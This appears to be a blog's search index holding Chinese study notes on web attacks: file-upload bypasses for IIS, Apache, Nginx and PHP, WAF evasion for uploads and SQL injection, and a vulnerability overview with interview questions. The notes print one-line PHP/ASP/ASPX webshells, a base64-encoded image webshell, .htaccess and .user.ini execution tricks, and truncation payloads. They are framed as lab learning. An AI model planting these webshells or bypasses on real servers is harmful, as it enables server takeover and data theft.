<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>文件上传（三）--WAF绕过思路</title>
    <link href="/2021/10/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E4%B8%89%EF%BC%89-WAF%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"/>
    <url>/2021/10/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E4%B8%89%EF%BC%89-WAF%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>这里我以著名的<code>upload-labs</code>文件上传靶场作为演示，图片因为博客搬迁丢失了qwq。</p><p>注意：由于WAF产品会不停更新换代，拦截手法也一再升级，所以这里介绍的方法可能会过时，请各位师傅灵活运用！这里的绕过手法只适用于黑名单，白名单只能配合文件包含或者iis7.5的解析漏洞！</p><h2 id="常用思路"><a href="#常用思路" class="headerlink" title="常用思路"></a>常用思路</h2><p>1.文件名后缀大小写绕过</p><p>2.文件名后缀双写绕过</p><p>3.命名规范绕过：尝试使用（正反）斜杠、星号、冒号(冒号会将文件内容置空)、问号、|、&lt;&gt;绕过</p><h2 id="骚姿势"><a href="#骚姿势" class="headerlink" title="骚姿势"></a>骚姿势</h2><p>1.http请求头中的<code>Content-Disposition</code>字段后面填充垃圾字符串</p><p>2.http请求头中的<code>filename</code>字段：</p><ul><li>加多个等于号</li><li>后缀名换行</li><li>单双引号替换</li><li>多个字段</li><li><code>&lt;</code>或<code>;</code>代替<code>.</code></li><li>在后缀名后面加上三个<code>&lt;&lt;&lt;</code></li><li>删除一个引号</li><li>引号替换为`或者在引号前添加`</li><li>00截断</li></ul><p>3.分块传输</p><p>4.非路径截断</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.php;jpg<br><span class="hljs-attribute">1</span>.php%<span class="hljs-number">00</span>.jpg<br><span class="hljs-attribute">1</span>.php/<span class="hljs-number">00</span>.jpg<br></code></pre></td></tr></table></figure><p>实战中一般在本地搭建环境，安装上目标机器的waf，然后使用burpsuite或者自己编写的Python脚本进行模糊测试，判断过滤掉的字符有哪些。除了文件上传的绕过以外，还要注意webshell的免杀和流量的检测。</p><p>暂时只能想到这么多了，如果师傅们有更好的思路，可以在评论区留言，谢谢！</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>模糊测试</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web漏洞综合</title>
    <link href="/2021/10/07/Web%E6%BC%8F%E6%B4%9E%E7%BB%BC%E5%90%88/"/>
    <url>/2021/10/07/Web%E6%BC%8F%E6%B4%9E%E7%BB%BC%E5%90%88/</url>
    
    <content type="html"><![CDATA[<p>前段时间学业繁忙，没有时间整理笔记。正好中秋放假，我就在这里把上周所学的知识归纳总结一下。由于笔记中提到的几种攻击方法如今在红队实战中很少用到，所以对于以下方法只需了解即可，但是安服岗的面试中时常会问到这些。</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS，即“跨站脚本攻击”(Cross Site Scripting)，为了不和“层叠样式表”(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击。</p><p>XSS分为以下三种类型：存储型，反射型和DOM型。</p><p>存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie 反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。 DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Object Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p><h2 id="命令执行（RCE）"><a href="#命令执行（RCE）" class="headerlink" title="命令执行（RCE）"></a>命令执行（RCE）</h2><p>命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一。</p><p>如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有<code>system( )</code>、<code>exec( )</code>、<code>shell_exec( )</code>、<code>passthru( )</code>、<code>pcntl_execl( )</code>、<code>popen( )</code>、<code>proc_open( )</code>等。当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击。PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大。</p><p>例如案例中的webug靶场，就是当PHP版本为5.2.17或5.4.45时存在命令执行漏洞。我们只需要在登录页面抓包，在http请求头中加入<code>Accept-Encoding:gzip,deflate</code>和<code>Accept-Charset:c3lzdGVtKCdscycpOw== //这里c3lzdGVtKCdscycpOw==是system(&#39;ls&#39;);的base64编码</code>，即可在响应包中看到相应的结果。或者当网站框架是thinkPHP时，可以利用exp实施攻击。</p><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p>权限类有以下三种：</p><p>1.水平越权：普通用户&#x2F;管理员能访问其他普通用户&#x2F;管理员才能够访问的系统信息或者系统功能。</p><p>2.垂直越权：普通用户能够访问管理员甚至超级管理员才能够访问的系统信息或者系统功能。</p><p>3.未授权访问：游客能够访问普通用户甚至超级管理员才能访问的系统信息或者系统功能。</p><p>其它的有支付金额修改、整数溢出、密码找回、验证码爆破等，这里就不再细说了。</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF（Cross Site Request Forgery, 跨站请求伪造）是一种网络的攻击方式，它在 2007 年曾被列为互联网 20 大安全隐患之一,也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（<a href="https://link.jianshu.com/?t=http://baike.baidu.com/view/50325.htm">XSS</a>），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与<a href="https://link.jianshu.com/?t=http://baike.baidu.com/view/50325.htm">XSS</a>攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比<a href="https://link.jianshu.com/?t=http://baike.baidu.com/view/50325.htm">XSS</a>更具危险性。</p><p>由于实战中条件较为苛刻（cookie未失效且知道相应参数），故现在很少使用。具体实施方法是：在本地编写一个伪造的页面，页面后端传递的参数和目标站点的相同，通过社工的方法引诱管理员点击相应按钮提交已经赋值的参数来新建一个管理员用户，再结合提权等手段拿到webshell。</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p><p>很多Web应用都提供了从其他服务器上获取数据的功能。使用用户指定的URL，Web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地服务器。</p><p>服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。大部分的web服务器架构中，web服务器自身都可以访问互联网和服务器所在的内网。</p><p><strong>那SSRF可以做什么呢？</strong></p><ul><li>可以对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息 。</li><li>攻击运行在内网或者本地的应用程序。</li><li>对内网web应用进行指纹识别，通过访问默认文件实现 。<br>攻击内外网的web应用。sql注入、strut2、redis等。<br>利用file协议读取本地文件等。</li></ul><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>序列化和反序列化存在于Java和PHP中，一般使用exp进行攻击，或者构造恶意的类。很多中间件都存在反序列化漏洞，例如fastjson、strut2、shiro、weblogic等。关于其中的原理，我将在以后的Java安全部分仔细探究。</p><h2 id="常问面试题"><a href="#常问面试题" class="headerlink" title="常问面试题"></a>常问面试题</h2><p>1.SSRF过滤了127.0.0.1，怎么绕过？</p><blockquote><p>localhost</p><p>十六进制编码</p><p>@（例如<a href="http://example.com@127.0.0.1/">http://example.com@127.0.0.1</a> ）</p><p>短链接</p><p>句号代替点</p><p>DNS解析</p><p>各种协议（gopher、sftp、gopher等等）</p></blockquote><p>2.PHP 代码执行的危险函数和PHP 命令执行函数有哪些？ </p><blockquote><p>PHP 代码执行的危险函数：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span>()、 <br><br><span class="hljs-title function_ invoke__">call_user_func_array</span>()、<span class="hljs-title function_ invoke__">create_function</span>()、 <br><br><span class="hljs-title function_ invoke__">array_map</span>() <br></code></pre></td></tr></table></figure><blockquote><p>PHP 命令执行函数：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>()、<span class="hljs-title function_ invoke__">shell_exec</span>()、 <br><br><span class="hljs-title function_ invoke__">passthru</span>()、<span class="hljs-title function_ invoke__">exec</span>()、<span class="hljs-title function_ invoke__">popen</span>()、<span class="hljs-title function_ invoke__">proc_open</span>()、<span class="hljs-title function_ invoke__">putenv</span>()<br></code></pre></td></tr></table></figure><p>3.fastjson漏洞原理</p><blockquote><p>在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数。</p></blockquote><p> 4.shiro反序列化漏洞原理？怎么发现？</p><blockquote><p>shiro反序列化主要是Apache shiro提供了一个remember的一个功能，用户登录成功后会生成经过加密并编码的cookie，保存在浏览器中方便用户的日常使用，而服务器对cookie的处理流程就是先获取浏览器上保存的cookie，然后将其bs64解码，再进行AES解密，再将其反序列化进行校验，而漏洞就是出现在这里，我们都知道AES它是一个硬编码，他是有默认密钥的，如果程序员没有去修改或者过于简单，那我们就可以进行cookie重构，先构造我们的恶意代码，然后将恶意代码进行序列化，然后AES加密(密钥我们已经爆破出来了)，再进行bs64编码，形成我们新的cookie，而服务器在处理时就会按照刚才的处理流程，就会在服务端触发我们构造的恶意代码。</p><p>登陆失败时候会返回rememberMe&#x3D;deleteMe字段或者使用shiroScan被动扫描去发现。</p></blockquote><p>5.shiro不出网怎么利用？</p><blockquote><p>1.定位Web目录写入文件</p><p>2.构造回显</p><p>3.内存马</p><p>4.时间延迟获取Web路径写入webshell</p></blockquote><p>6.XSS,CSRF,SSRF三种漏洞的区别</p><blockquote><p>XSS：XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的 脚本语句被执行。</p><p>CSRF： CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以 利用用户的Cookie信息伪造用户请求发送至服务器。 </p><p>SSRF：SSRF是服务器对 用户提供的可控URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Web安全top10漏洞的学习就告一段落了，下周将进行提权部分的学习，敬请期待！</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传（二）--Apache和Nginx</title>
    <link href="/2021/10/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E4%BA%8C%EF%BC%89-Apache%E5%92%8CNginx/"/>
    <url>/2021/10/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E4%BA%8C%EF%BC%89-Apache%E5%92%8CNginx/</url>
    
    <content type="html"><![CDATA[<p>下面我们来总结另外几个与中间件以及http请求头有关文件上传的漏洞，它们都与客户机或服务器的操作系统无关。</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><h3 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h3><p>由于Apache解析文件后缀名的顺序是从右往左，所以我们可以在文件名最后加上Apache无法识别的文件后缀名来绕过。例如我们要上传一个PHP木马，那我们可以把文件名命名为”*.php.123”，其中”123”是Apache无法识别的后缀名，则Apache会解析左边的”php”后缀名，从而实现绕过。</p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>Apache中的.htaccess文件是用户用来自定义管理目录的，我们可以新建一个”.htaccess”文件，并在里面写入自定义的内容，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">&lt;FilesMatch &quot;test&quot;&gt;<br>    SetHandler<br>    application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>这样Apache会把文件名中含有”test”的文件当作PHP文件执行。利用这个特性，我们可以把图片马以这样的方式让Apache解析。</p><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><h3 id="文件名解析漏洞-1"><a href="#文件名解析漏洞-1" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h3><p>大多数网站都使用白名单机制限制上传文件类型，但是我们可以在上传文件的路径后面加上”*.php”，例如<code>https://www.example.com/upload/1.png/2.php</code>。当Nginx解析到URL中的”2.php”时，由于我们并没有真正上传这个文件，Nginx会向上级目录查找，即把我们实际上传的”1.png”当作PHP文件解析。这里”1.png”实际上是修改了后缀名的大马或小马。</p><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>和上面Apache的<code>.htaccess</code>配置文件类似，<code>.user.ini</code>是用户自定义的PHP配置文件，我们可以利用这个文件来构造后门和隐藏后门。</p><p>PHP 配置项中有两个配置可以起到一些作用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">auto_prepend_file = &lt;filename&gt;         <span class="hljs-comment">//包含在文件头</span><br>auto_append_file = &lt;filename&gt;          <span class="hljs-comment">//包含在文件尾</span><br></code></pre></td></tr></table></figure><p>这两个配置项的作用相当于一个文件包含，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// .user.ini</span><br>auto_prepend_file = <span class="hljs-number">1</span>.jpg<br><span class="hljs-comment">// 1.jpg</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// 1.php(任意php文件)</span><br></code></pre></td></tr></table></figure><p>满足这三个文件在同一目录下，则相当于在1.php文件里插入了包含语句require(‘1.png’)，进行了文件包含。</p><p>另一条配置包含在文件尾，如果遇到了 exit 语句的话就会失效。</p><p>.user.ini使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。</p><p><strong>但它同时也存在局限。</strong>在.user.ini中使用这条配置也说了是在同目录下的其他.php 文件中包含配置中所指定的文件，也就是说需要该目录下存在.php 文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。但是有时可以使用 ..&#x2F; 来将文件上传到其他目录，达到一个利用的效果。</p><h3 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h3><p>在PHP的<code>base64_decode</code>中，会只对合法字符合并后解码，非法字符则直接丢弃，不参与整体的base64解码。合法字符包含以下64个字符：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span>-Za-z0-<span class="hljs-number">9</span>/+<br></code></pre></td></tr></table></figure><p>等于号是占位符，不是编码范围内的字符。利用PHP的这种特性，我们可以编写图片马，在正常的图片中插入base64编码后的一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">PD89YCRfR0VUWzFdYDs7Pz4C<br><span class="hljs-comment">//base64_decode后得到：</span><br><span class="hljs-meta">&lt;?=</span>`<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]`;;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用方式：<code>URL?1=phpinfo()</code></p><h3 id="MIME类型检测"><a href="#MIME类型检测" class="headerlink" title="MIME类型检测"></a>MIME类型检测</h3><p>服务器通过对http请求头里的”content-type”字段进行检验，来判断文件类型是否符合要求。常见的符合要求的文件名有:image&#x2F;jpeg,image&#x2F;gif,image&#x2F;png等。要利用这个漏洞，我们需要把http请求头中的”content-type”字段改为上面几种符合要求的MIME即可。不过要注意要在文件头加上”GIF89a”来绕过可能的文件头校验。</p><p><strong>那如果遇到白名单检测呢？这时候就要配合文件包含和%00截断漏洞了。在以后的笔记中，我将会总结WAF绕过的一些技巧。</strong></p><p><em>P.S.开学了，以后笔记的提交和更新频率会有所减慢，敬请谅解！</em></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传（一）--IIS</title>
    <link href="/2021/10/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E4%B8%80%EF%BC%89-IIS/"/>
    <url>/2021/10/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E4%B8%80%EF%BC%89-IIS/</url>
    
    <content type="html"><![CDATA[<h2 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h2><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。 这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。</p><p>什么是WebShell？WebShell是黑客经常使用的一种恶意脚本，其目的是获得对服务器的执行操作权限，比如执行系统命令、窃取用户数据、删除web页面、修改主页等，其危害不言而喻。黑客通常利用常见的漏洞，如SQL注入、远程文件包含(RFI)、FTP，甚至使用跨站点脚本攻击(XSS)等方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。常见的WebShell编写语言为asp(aspx)、jsp和php。</p><h2 id="IIS文件上传漏洞"><a href="#IIS文件上传漏洞" class="headerlink" title="IIS文件上传漏洞"></a>IIS文件上传漏洞</h2><h3 id="目录解析漏洞"><a href="#目录解析漏洞" class="headerlink" title="目录解析漏洞"></a>目录解析漏洞</h3><p>低版本的IIS（例如IIS6.0及以下版本）存在目录解析漏洞，如果在上传文件的路径下新建一个名为”.asp”的文件夹，那么上传到文件夹里面的所有文件都会被IIS视作asp文件来执行。即使代码层限制了上传文件的类型为png、gif、jpg等，我们也可以通过上传<strong>图片马</strong>的方式使IIS解析到<strong>一句话木马</strong>，再使用蚁剑、冰蝎等连接工具查看服务器目录，甚至执行命令。</p><p>如果CMS后台没有更改上传路径的功能，我们也可以使用burpsuite抓包来尝试出正确的上传路径。</p><p>一句话木马有哪些呢？</p><p>PHP:<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code> ASP: <code>&lt;%eval request (&quot;pass&quot;)%&gt;</code> ASPX:<code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code></p><p><em>这里的@符号意思是不报错，即使有错误也不报（掩耳盗铃），以免错误信息存入服务器日志，引起警觉。</em></p><p>那怎么生成图片马呢？用记事本、notepad++等程序打开正常的图片，并在最后加入一句话木马，保存即可。</p><h3 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h3><p>低版本的IIS（例如IIS6.0及以下版本）也存在文件名解析漏洞，如果把文件命名为”*.asp;.jpg”，则文件名在“；”后面的部分直接被忽略，也就是说当成 *.asp文件执行。上传的jpg文件则是我们提前写好的图片马。</p><h3 id="PUT攻击漏洞"><a href="#PUT攻击漏洞" class="headerlink" title="PUT攻击漏洞"></a>PUT攻击漏洞</h3><p>所谓put攻击，是指利用http1.1中新增加的put方法上传木马。如果服务器上有对应资源，则后上传文件的会覆盖掉之前的文件；如果没有，则服务器上新增该文件。所以往服务器上增加文件的操作一般使用post方法。</p><p>如果IIS服务器端开启了webdav服务，以及所有用户的写入权限，那么我们可以进行put攻击。我们先使用IIS PUT Scanner这款扫描器，扫描C段内可以进行put攻击的服务器。然后我们把要上传的小马改成txt后缀，再用桂林老兵的IIS写入工具，用put方式上传txt后缀的小马，提交数据包以后可以访问文件所在位置确定是否上传成功。如果上传成功，则用move方式改变刚上传小马的文件名和后缀（asp,aspx,php等），这样小马就成功地上传到了服务器，我们也可以利用小马进一步对目标服务器进行操作。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在下一篇笔记中，我会总结出另外几种与中间件以及http请求头有关的文件上传漏洞。</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入（四）--WAF绕过思路</title>
    <link href="/2021/10/06/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%9B%9B%EF%BC%89-WAF%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"/>
    <url>/2021/10/06/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%9B%9B%EF%BC%89-WAF%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是WAF"><a href="#什么是WAF" class="headerlink" title="什么是WAF"></a>什么是WAF</h2><p>什么是WAF？WAF(Web Application Firewall)，即网站应用防火墙，通过过滤和监视Web应用程序与Internet之间的HTTP通信来帮助保护Web应用程序。它通常可以保护Web应用程序免受跨站点伪造（CSRF&#x2F;SSRF），跨站点脚本（XSS），文件上传和SQL注入等攻击。 WAF工作在OSI模型的第七层（即应用层），并非用于防御所有类型的攻击。</p><h2 id="WAF防御原理"><a href="#WAF防御原理" class="headerlink" title="WAF防御原理"></a>WAF防御原理</h2><p>简单来说，waf就是解析http请求，通过正则表达式匹配，检测http请求中的参数是否存在恶意的攻击行为，如果请求中的参数和waf中的规则库所匹配，那么waf则判断此条请求为攻击行为并进行阻断，反之则放行。</p><p>常见的SQL注入绕过WAF有两种方法：</p><p>一种是利用waf可能存在的http协议解析缺陷来绕过waf，另外一种是利用各种方式来包装sql注入语句进行混淆来绕过waf的规则库。</p><h2 id="常用手法"><a href="#常用手法" class="headerlink" title="常用手法"></a>常用手法</h2><p>注意：由于WAF产品会不停更新换代，拦截手法也一再升级，所以这里介绍的方法可能会过时，请各位师傅灵活运用！</p><p>1.加密解密：通常使用异或（xor）、md5加密payload。</p><p>2.编码解码：base64、hex、Unicode、URL······</p><p>3.等价（冷门）函数：例如<code>hex()</code>,<code>bin()</code>等价于<code>ascii()</code>，<code>mid()</code>,<code>substring()</code>等价于<code>substr()</code>，以此类推。</p><p>4.特殊符号：我们加进去一些特殊符号，数据库不会产生其他影响，举个例子我们要查询当前用的是什么数据库，那我们<code>select database();</code>就可以了，但是十有八九会被waf拦截，我们就可以在database的前面添加一些特殊符号，比如<code>~</code>,<code>!</code>,<code>&#123;</code>,<code>\n</code>,单双引号之类的都可以。</p><p>5.注释符混用：众所周知，MySQL有多种注释符，例如<code>#</code>,<code>-- =</code>,<code>/**/</code>。</p><p>6.空格替换：SQL语句中的空格，可以用<code>+</code>,<code>:</code>或它们的URL编码进行替换。</p><p>7.换行符：在URL编码中，<code>%23</code>代表<code>#</code>号，<code>%0A</code>代表换行符。我们可以把它们加在payload里，起到迷惑waf的作用。</p><p>8.大小写绕过：例如<code>sElECt</code>,<code>dATaBasE()</code>。</p><p>9.双写绕过：例如<code>selselectect</code>。</p><p>10.拆分绕过：以联合注入为例，我们去掉了<code>union</code>发现waf不会拦截，但是去掉<code>select</code>，发现waf也不会拦截。只要这两个东西在一起使用的话，就会拦截，因为<code>union select</code>就是waf拦截掉的联合查询。</p><p>所以我们的绕过思路就是，不让这两个在一起，并且可以执行这个sql语句。比如说我们在<code>union</code>和<code>select</code>中都加上注释符，变成<code>uni/**/on /**/select </code>这样，以此类推。</p><p>再以查询当前数据库为例，我们先将<code>database()</code>拆开试试，我们先输入一个<code>database</code>，我们发现waf不会拦截，我们在单输入一个括号<code>（</code>，也不会拦截，因为这种写法是错误的。我们通过上面这个例子可以发现，拦截的不是<code>database</code>也不是<code>（）</code>，拦截的是<code>database（）</code>这个整体。所以绕过的思路应该是让<code>database</code>和<code>（）</code>拆分，但是不能影响数据库的运行，如果实现这个的话，我们也就可以实现waf的绕过了。</p><h2 id="骚姿势"><a href="#骚姿势" class="headerlink" title="骚姿势"></a>骚姿势</h2><p>上面介绍了常用的手法，下面是我从其他师傅那里学到的骚姿势：</p><p>1.GET和POST同时请求</p><p>2.垃圾字符串</p><p>3.内联注释：例如<code>/*!50000aaa*/</code>的形式，当5000小于当前MySQL版本号的时候，注释不生效，当大于版本号的时候注释生效。</p><p>4.正则表达式函数（<code>regexp()</code>）</p><p>5.脚本语言特性：例如<code>%00</code>截断仅可用于aspx+mssql</p><p>6.关键字替换：<code>and</code>可以替换为<code>&amp;&amp;</code>，<code>or</code>可以替换为<code>||</code>，<code>(1,2)</code>可以替换为<code>from 1 to 2</code>。</p><p>实战中一般在本地搭建环境，安装上目标机器的waf，然后使用burpsuite或者自己编写的Python脚本进行模糊测试，判断过滤掉的字符有哪些。</p><p>暂时只能想到这么多了，如果师傅们有更好的思路，可以在评论区留言，谢谢！</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>模糊测试</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入（三）--SQL server和Oracle注入</title>
    <link href="/2021/10/05/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89-SQL-server%E5%92%8COracle%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/10/05/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89-SQL-server%E5%92%8COracle%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL-server和Oracle数据库注入"><a href="#SQL-server和Oracle数据库注入" class="headerlink" title="SQL server和Oracle数据库注入"></a>SQL server和Oracle数据库注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ms SQL是指微软的<a href="https://baike.baidu.com/item/SQL">SQL Server</a><a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8">数据库服务器</a>，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/1239101">数据库管理系统</a>，用于建立、使用和维护数据库。</p><p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是<a href="https://baike.baidu.com/item/%E7%94%B2%E9%AA%A8%E6%96%87%E5%85%AC%E5%8F%B8/430115">甲骨文公司</a>的一款<a href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/11032386">关系数据库管理系统</a>。它是在数据库领域一直处于领先地位的产品。可以说Oracle数据库系统是目前世界上流行的<a href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/1237340">关系数据库</a>管理系统，系统<a href="https://baike.baidu.com/item/%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%80%A7/6931884">可移植性</a>好、使用方便、功能强，适用于各类大、中、小<a 